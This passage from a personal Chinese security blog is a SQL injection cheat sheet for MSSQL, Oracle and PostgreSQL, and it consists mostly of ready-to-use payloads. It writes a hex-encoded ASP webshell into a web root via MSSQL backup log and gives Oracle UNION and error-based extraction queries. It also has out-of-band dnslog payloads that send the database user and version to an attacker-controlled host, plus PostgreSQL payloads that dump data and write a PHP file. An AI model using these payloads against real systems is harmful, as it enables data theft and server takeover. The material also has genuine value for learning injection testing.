+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mssql">alter database testdb set RECOVERY FULL <br>backup database testdb to disk = &#x27;c:\bak.bak&#x27;<br>create table cmd (a image) <br>backup log testdb to disk = &#x27;c:\aaa.bak&#x27; with init <br>insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E) <br>backup log testdb to disk = &#x27;C:\inetpub\wwwroot\shell.asp&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>两个数据库都可以成功，备份文件小，不容易出现脏数据</p>
+<p>注：0x3C25657865637574652872657175657374282261222929253E是asp一句话木马，如果其他语言也需要更改16进制的内容</p>
+<hr>
+<p>后面文章里面还记录了一个劫持粘滞键getshell的，这里暂时不作记录，个人认为可能用不到</p>
+<p>这里找到了一个靶场：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Larryxi/MSSQL-SQLi-Labs">https://github.com/Larryxi/MSSQL-SQLi-Labs</a></p>
+<p>之后有空可能会看看吧。。不一定会学的像MySQL一样仔细</p>
+<h1 id="Orancle"><a href="#Orancle" class="headerlink" title="Orancle"></a>Orancle</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ayoung/p/15329033.html">https://www.cnblogs.com/ayoung/p/15329033.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/15582881.html">https://www.cnblogs.com/wuhongbin/p/15582881.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10469">https://xz.aliyun.com/t/10469</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9940">https://xz.aliyun.com/t/9940</a></p>
+</blockquote>
+<h2 id="判断方法-2"><a href="#判断方法-2" class="headerlink" title="判断方法"></a>判断方法</h2><p>利用函数来判断是否oracle数据 如：and len(‘a’)&#x3D;1<br>（在mssql和mysql以及db2内，返回长度值是调用len()函数；在oracle和INFORMIX则是通过length()来返回长度值，但是postgresql也是length，需要注意）<br>也可以通过dual进一步来判断是否为oracle</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">&gt;</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-keyword">where</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">&gt;</span><span class="hljs-number">0</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="基本注入-2"><a href="#基本注入-2" class="headerlink" title="基本注入"></a>基本注入</h2><h3 id="联合查询-1"><a href="#联合查询-1" class="headerlink" title="联合查询"></a>联合查询</h3><ol>
+<li><p>闭合 同MySQL 注释符为 –+</p>
+</li>
+<li><p>判断字段数  同MySQL </p>
+</li>
+<li><p>联合查询找回显位 同Sql Server<br> Oracle 数据库查询需要 from dual (虚表&#x2F;伪表) 专为查询语句设置的表</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br><span class="hljs-keyword">null</span>代替所有类型<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查询数据库版本、数据库连接用户、当前实例名 </p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> SYS_CONTEXT(<span class="hljs-string">&#x27;USERENV&#x27;</span>,<span class="hljs-string">&#x27;CURRENT_USER&#x27;</span>) <span class="hljs-keyword">from</span> dual),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">-- #test</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> instance_name <span class="hljs-keyword">from</span> v$instance),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>遍历数据库名</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> owner <span class="hljs-keyword">from</span> all_tables <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> DUAL<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+</li>
+<li><p>遍历表名</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> 数据库名 <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> DUAL<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+<p>  7.遍历flag表字段名</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> 列名 <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;表名&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> DUAL<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+<p>  8.查询表字段数据</p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> 列名<span class="hljs-number">1</span><span class="hljs-operator">||</span>列名<span class="hljs-number">2</span> <span class="hljs-keyword">FROM</span> 表名 <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br>id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;username:&#x27;</span><span class="hljs-operator">||</span>NAME<span class="hljs-operator">||</span><span class="hljs-string">&#x27;age:&#x27;</span><span class="hljs-operator">||</span>AGE <span class="hljs-keyword">FROM</span> DEMO <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> dual<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用 <strong>utl_inaddr.get_host_name</strong><br>这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在<strong>Oracle 11g以及以后</strong>的版本中，官方加强了访问控制权限，所以在11g以后要使用此方法进行报错注入，当前数据库用户必须有网络访问权限</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-string">&#x27; and 1=utl_inaddr.get_host_name((select user from dual))-- </span><br></code></pre></td></tr></table></figure>
+
+<p>利用 <strong>ctxsys.drithsx.sn()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-string">&#x27; and 1=ctxsys.drithsx.sn(1,(select user from dual))-- </span><br></code></pre></td></tr></table></figure>
+
+<p>利用 <strong>dbms_xdb_version.checkin()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null–- </span><br></code></pre></td></tr></table></figure>
+
+<p>利用<strong>dbms_xdb_version.uncheckout()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null --</span><br></code></pre></td></tr></table></figure>
+
+<p>利用<strong>dbms_utility.sqlid_to_sqlhash()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null --</span><br></code></pre></td></tr></table></figure>
+
+<p>利用<strong>ordsys.ord_dicom.getmappingxpath()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)</span><br></code></pre></td></tr></table></figure>
+
+<p>使用decode进行报错注入，这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=(select decode(substr(user,1,1),&#x27;</span>A<span class="hljs-string">&#x27;,(1/0),0) from dual) --</span><br></code></pre></td></tr></table></figure>
+
+<p>这里是判断第一位是否为A,依次判断</p>
+<p><strong>XMLType</strong></p>
+<p>在使用这个XMLType进行报错时，很多人不知道为什么要用chr(60)，通过ascii查询可以看到，60:&lt; , 58:’:’,62:’&gt;’,查了下相关的api，发现xmltype在进行解析的时候必须以&lt;开头&gt;结尾，这里:冒号在这是必不可少的，至于为什么是冒号这个我也没查到，另外需要注意的是如果返回的数据种有空格的话，它会自动截断，导致数据不完整，有replace函数替换成其他非空字符就可以。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="Oracle带外通信获取信息-dnslog注入"><a href="#Oracle带外通信获取信息-dnslog注入" class="headerlink" title="Oracle带外通信获取信息 dnslog注入"></a>Oracle带外通信获取信息 dnslog注入</h3><p><strong>utl_http.request()</strong>  dnslog注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and 1=utl_http.request(&#x27;</span>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span>(自己搭建dnslog或者用现有的):<span class="hljs-number">80</span><span class="hljs-operator">/</span><span class="hljs-string">&#x27;||(select banner from sys.v_$version where rownum=1)) --</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>utl_inaddr.get_host_address()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select utl_inaddr.get_host_address((select user from dual)||&#x27;</span>.sssss.com(自己搭建dnslog或者用现有的)<span class="hljs-string">&#x27;) from dual)is not null --</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>SYS.DBMS_LDAP.INIT</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.test.com<span class="hljs-operator">/</span>oracle.jsp?name<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select SYS.DBMS_LDAP.INIT((select user from dual)||&#x27;</span>.sssss.com(自己搭建dnslog或者用现有的)<span class="hljs-string">&#x27;) from dual)is not null --</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="GetShell-2"><a href="#GetShell-2" class="headerlink" title="GetShell"></a>GetShell</h2><p>依靠万能的sqlmap</p>
+<h1 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/125641760">https://blog.csdn.net/qq_51295677/article/details/125641760</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/249371.html">https://www.freebuf.com/articles/web/249371.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42357070/article/details/81873458">https://blog.csdn.net/qq_42357070/article/details/81873458</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/rainx/topics/1396671">https://www.dazhuanlan.com/rainx/topics/1396671</a></p>
+</blockquote>
+<h2 id="判断方法-3"><a href="#判断方法-3" class="headerlink" title="判断方法"></a>判断方法</h2><p><code>and len(&#39;a&#39;)=1</code> 是否出现报错，因为在postgresql里面使用的是length函数来返回长度，如果出现报错，那么可以大致判断是postgresql或orancle（不排除其他非主流数据库类型）</p>
+<p>并且orancle可以使用dual表来判断，如果测试后无dual，就可以大致判断是postgresql了</p>
+<p>当然还有一种方式：</p>
+<p>postgreSQL查询当前数据库使用：current_database()函数</p>
+<h2 id="基本注入-3"><a href="#基本注入-3" class="headerlink" title="基本注入"></a>基本注入</h2><p>结合了MySQL的语句和sqlserver的强类型，为我们的报错注入埋下了伏笔</p>
+<h3 id="联合查询-2"><a href="#联合查询-2" class="headerlink" title="联合查询"></a>联合查询</h3><ol>
+<li><p>判断闭合 注释符为–+ 同MySQL</p>
+</li>
+<li><p>获取字段数 同MySQL</p>
+</li>
+<li><p>注出回显点 结合mysql+sqlserver</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,(<span class="hljs-string">&#x27;11111&#x27;</span>),<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- 查看是否输出 11111</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库名</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,current_database(),<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取数据库中的表</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,tablename,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> pg_tables <span class="hljs-keyword">where</span> schemaname=<span class="hljs-string">&#x27;public&#x27;</span>  <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p>需要修改offest后的数字</p>
+</li>
+<li><p>获取表中的列名</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-built_in">column_name</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;表名&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">1</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>​	需要修改offest后的数字</p>
+<ol start="7">
+<li><p>dump全部内容</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">12</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,列名<span class="hljs-number">1</span>||<span class="hljs-string">&#x27;::&#x27;</span>||列名<span class="hljs-number">2</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">public</span>.表名<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p>返回内容将是”列名1数据::列名2数据“</p>
+</li>
+</ol>
+<h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><p>postgresql的报错注入原理与MSSQL的相同利用强类型语言数据库特性，当类型不一致时将会报错带出敏感数据达到注入的目的。具体用到的函数与MSSQL相同，cast()或者convert()这种强制转换的函数在与一个数比较达到报错目的。（前提是目标网站开启了报错提示）。</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs postgresql">查看版本：<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">SELECT</span> version())::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><br>查库：<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">SELECT</span> current_database())::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">SELECT</span> datname <span class="hljs-keyword">from</span> pg_database <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>)::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><br>查表：<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">SELECT</span> relname <span class="hljs-keyword">from</span> pg_stat_user_tables <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>)::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><br><br>查列：<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">2</span>=CAST((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>)::<span class="hljs-type">text</span> <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br><br><br>还有一个sqlmap跑出来的payload（仅供参考）：<br><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">7778</span>=CAST((CHR(<span class="hljs-number">113</span>)||CHR(<span class="hljs-number">98</span>)||CHR(<span class="hljs-number">122</span>)||CHR(<span class="hljs-number">106</span>)||CHR(<span class="hljs-number">113</span>))||(<span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">7778</span>=<span class="hljs-number">7778</span>) <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> <span class="hljs-number">0</span> <span class="hljs-keyword">END</span>))::<span class="hljs-type">text</span>||(CHR(<span class="hljs-number">113</span>)||CHR(<span class="hljs-number">118</span>)||CHR(<span class="hljs-number">112</span>)||CHR(<span class="hljs-number">106</span>)||CHR(<span class="hljs-number">113</span>)) <span class="hljs-keyword">AS</span> <span class="hljs-type">NUMERIC</span>)<br>这里解释一下这几个函数在这里面的作用：<br><br>CAST()：强制转换，在这里主要格式为CAST(<span class="hljs-string">&#x27;string&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">NUMERIC</span>)，即将字符串转换为数字型。<br><br><span class="hljs-number">1</span>::<span class="hljs-type">text</span>  :   这个和上面恰好相反，它的意思是将一个数字型转换为<span class="hljs-type">text</span>文本类型<br><br>sqlmap中有个<span class="hljs-keyword">case</span>...<span class="hljs-keyword">when</span>...<span class="hljs-keyword">then</span>...<span class="hljs-keyword">else</span>...<span class="hljs-keyword">end</span>  是类似与<span class="hljs-keyword">if</span>的分支条件语句<br></code></pre></td></tr></table></figure>
+
+<h2 id="GetShell-3"><a href="#GetShell-3" class="headerlink" title="GetShell"></a>GetShell</h2><p>普通写shell</p>
+<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs postgresql"><span class="hljs-keyword">COPY</span> (<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;/tmp/1.php&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>偌大的互联网，我竟然只找到一句有用的😭</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这篇文章只是粗略的介绍，盲注的内容我全部省略了，此文章作为自己的参考，希望可以帮助到为数不多的读者</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/04/Xss%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">Xss注入总结 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%8E%86%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">注入历程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%8D%E7%9B%98%E5%8F%8D%E6%80%9D"><span class="toc-number">3.</span> <span class="toc-text">复盘反思</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlite"><span class="toc-number">4.</span> <span class="toc-text">Sqlite</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 